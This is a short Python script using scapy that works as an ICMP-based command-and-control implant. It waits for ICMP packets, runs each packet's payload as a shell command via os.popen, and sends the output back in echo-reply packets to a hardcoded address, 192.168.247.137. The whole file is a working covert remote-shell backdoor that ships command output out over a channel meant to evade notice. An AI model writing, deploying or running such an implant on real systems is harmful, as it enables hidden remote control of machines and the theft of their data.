#!/usr/bin/env python3

import os
from scapy.all import *


def main():
    while True:
        # wait for the ICMP message containing the command from the C2 server
        # to be received
        rx = sniff(filter="icmp", count=1)
        # strip down the packet to the payload itself
        var = rx[0][Raw].load.decode('utf-8')
        # run the command and save the result
        res = os.popen(var).read()
        # build the ICMP packet with the result as the payload
        #send(IP(dst="127.0.0.1")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)
        send(IP(dst="192.168.247.137")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)

		
if __name__ == "__main__":
    main()
